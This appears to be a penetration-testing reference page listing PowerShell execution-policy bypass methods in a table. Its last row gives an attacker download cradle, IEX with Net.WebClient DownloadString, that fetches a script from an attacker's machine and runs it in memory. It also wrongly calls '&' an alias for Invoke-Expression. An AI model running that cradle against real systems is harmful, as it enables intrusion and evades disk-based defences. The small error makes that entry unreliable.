# Privilege Escalation

## Script Execution Policy Bypass Methods

<table>
  <thead>
    <tr>
      <th style="text-align:left">Bypass Method</th>
      <th style="text-align:left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left"><code>Set-Executionpolicy unrestricted</code>
      </td>
      <td style="text-align:left">Administrator rights are required.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>Set-ExecutionPolicy -Scope CurrentUser Unrestricted</code>
      </td>
      <td style="text-align:left">Only works in the context of the current user, but requires no Administrator
        rights.</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <ol>
          <li>Open .ps1 file in text editor.</li>
          <li>Copy all text in the file</li>
          <li>Paste into PowerShell</li>
        </ol>
      </td>
      <td style="text-align:left">PowerShell will run each line of the script one at a time, essentially
        the same as running the script.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>function &lt;name&gt; { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">Similar to the above example, however you paste your code inside the curly
        braces, and run the code by typing the <code>&lt;name&gt;</code> of your
        function. Allows for <b>code reuse without having to copy and paste multiple times.</b>
      </td>
    </tr>
    <tr>
      <td style="text-align:left"><code>cat &lt;C:\script.ps1&gt; | IEX</code>
      </td>
      <td style="text-align:left">Pipes the output of the script to the <code>Invoke-Expression</code> cmdlet,
        which runs any specified string as a command and returns the results to
        the console. <code>IEX</code> is an alias for <code>Invoke-Expression</code>.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>IEX { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">Essentially creates a one-time use function from your code.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>&amp; { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">The operator (<code>&amp;</code>) is an alias for <code>Invoke-Expression</code> and
        is equivelent to the example above.</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p><code>$text = Get-Content C:\temp\AnyFile.txt -Raw</code>
        </p>
        <p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code>
        </p>
        <p>&lt;code&gt;&lt;/code&gt;</p>
        <p><code>&amp; $script</code>
        </p>
      </td>
      <td style="text-align:left">Using the .NET object <code>System.Management.Automation.ScriptBlock</code> we
        can compile and text content to a script block. Then, using (<code>&amp;</code>)
        we can easily execute this compiled and formatted text file.</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p><code>Echo IEX(New-Object Net.WebClient).DownloadString(http://&lt;ip:port/filename.ps1&gt;) | PowerShell -NoProfile -</code>
        </p>
        <p></p>
      </td>
      <td style="text-align:left">Download script from attacker&apos;s machine, then run in PowerShell,
        in memory. No files are written to disk.</td>
    </tr>
  </tbody>
</table>



## References

* [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)

